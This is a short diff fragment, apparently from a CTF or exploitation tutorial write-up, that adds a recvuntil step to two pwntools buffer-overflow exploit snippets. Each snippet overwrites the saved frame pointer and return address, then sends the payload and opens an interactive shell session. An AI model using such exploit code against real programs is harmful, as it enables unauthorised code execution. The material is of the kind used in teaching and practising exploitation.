@@ -21,6 +21,7 @@ ret = p32(0x08048087)
 
 payload = dummy + sfp + ret
 
+p.recvuntil('input: ')
 p.send(payload)
 p.interactive()
 ~~~
@@ -40,6 +41,7 @@ ret = p64(0x08048087)
 
 payload = dummy + sfp + ret
 
+p.recvuntil('input: ')
 p.send(payload)
 p.interactive()
 ~~~
